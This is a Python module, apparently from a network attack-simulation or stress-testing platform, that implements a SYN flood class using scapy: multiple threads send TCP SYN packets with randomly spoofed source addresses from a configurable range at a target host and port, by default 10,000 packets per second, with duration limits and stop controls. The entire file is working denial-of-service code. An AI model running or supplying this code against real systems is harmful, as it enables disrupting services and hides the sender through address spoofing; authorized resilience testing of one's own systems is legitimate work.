from __future__ import annotations

import asyncio
import os
import time
from typing import Optional
import structlog

from app.attacks.base import SafeAttackBase, AttackRegistry, SafetyError
from app.models import AttackCommand, AttackType, AttackStatus

logger = structlog.get_logger(__name__)

try:
    from scapy.all import IP, TCP, send, RandShort, RandIP, RandInt, conf
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    logger.warning("scapy_not_available_syn_flood_disabled")


def _check_raw_capability() -> bool:
    """MED-6 修复: 使用 /proc/self/status 检查 CAP_NET_RAW"""
    try:
        with open("/proc/self/status", "r") as f:
            for line in f:
                if line.startswith("CapEff:"):
                    cap_eff = int(line.split(":")[1].strip(), 16)
                    # CAP_NET_RAW = 13 (bit 13)
                    return bool(cap_eff & (1 << 13))
    except (IOError, ValueError):
        pass
    # fallback: 检查 root
    return os.geteuid() == 0


class SYNFloodAttack(SafeAttackBase):
    """
    SYN Flood 攻击 - scapy 发送伪造源 IP 的 SYN 包
    HIGH-3 修复: 使用 asyncio.get_running_loop() 替代 get_event_loop()
    """

    NAME = "syn_flood"
    ATTACK_TYPE = AttackType.SYN_FLOOD
    REQUIRES_ROOT = True
    DEFAULT_RPS = 10000
    DEFAULT_CONCURRENCY = 4

    def __init__(self, command: AttackCommand):
        super().__init__(command)
        self._sender_tasks: list = []

    @classmethod
    def pre_flight_check(cls, target: str) -> None:
        super().pre_flight_check(target)
        if not SCAPY_AVAILABLE:
            raise SafetyError("scapy not installed")
        if not _check_raw_capability():
            raise SafetyError("SYN flood requires root or CAP_NET_RAW")

    async def _run(self):
        if not SCAPY_AVAILABLE:
            raise SafetyError("scapy not available")

        target = self.params.target
        target_ip = target.ip
        target_port = target.port
        interface = self.params.interface or conf.iface
        spoof_cidr = self.params.spoof_cidr or "10.0.0.0/8"

        threads = self.params.concurrency
        pps_per_thread = max(1, self.params.rps // threads)

        logger.info("syn_flood_starting",
                     target=target_ip, port=target_port,
                     threads=threads, pps_per_thread=pps_per_thread,
                     spoof_cidr=spoof_cidr, interface=interface)

        loop = asyncio.get_running_loop()
        for i in range(threads):
            task = loop.run_in_executor(
                None,
                self._sender_thread,
                target_ip, target_port, interface, spoof_cidr, pps_per_thread, i
            )
            self._sender_tasks.append(task)

        await asyncio.gather(*self._sender_tasks, return_exceptions=True)

    def _sender_thread(self, target_ip: str, target_port: int, interface: str,
                       spoof_cidr: str, pps: int, thread_id: int):
        conf.iface = interface
        conf.verb = 0

        interval = 1.0 / pps if pps > 0 else 0.001
        next_send = time.monotonic()
        sent_count = 0

        try:
            while not self.EMERGENCY_STOP.is_set() and not self._stop_event.is_set():
                now = time.monotonic()

                if self._start_time and (now - self._start_time) >= self.params.duration:
                    break

                try:
                    pkt = IP(dst=target_ip, src=RandIP(spoof_cidr)) / \
                          TCP(sport=RandShort(), dport=target_port, flags="S", seq=RandInt())
                    send(pkt, verbose=0, iface=interface)
                    sent_count += 1
                except Exception as e:
                    logger.debug("syn_send_failed", thread=thread_id, error=str(e))

                next_send += interval
                sleep_time = next_send - time.monotonic()
                if sleep_time > 0:
                    time.sleep(sleep_time)
                else:
                    next_send = time.monotonic()

            self.result.total_requests += sent_count
            self.result.successful_requests += sent_count
            self.result.metrics[f"thread_{thread_id}_sent"] = sent_count

        except Exception as e:
            logger.error("syn_thread_error", thread=thread_id, error=str(e))
            self.result.errors.append(f"Thread {thread_id}: {e}")

    async def stop(self, reason: str = "manual"):
        logger.info("syn_flood_stop_requested", attack_id=self.attack_id, reason=reason)
        self._stop_event.set()
        if self._sender_tasks:
            await asyncio.gather(*self._sender_tasks, return_exceptions=True)

    async def _cleanup(self):
        await super()._cleanup()
        self._sender_tasks.clear()


if SCAPY_AVAILABLE:
    AttackRegistry.register(AttackType.SYN_FLOOD, SYNFloodAttack)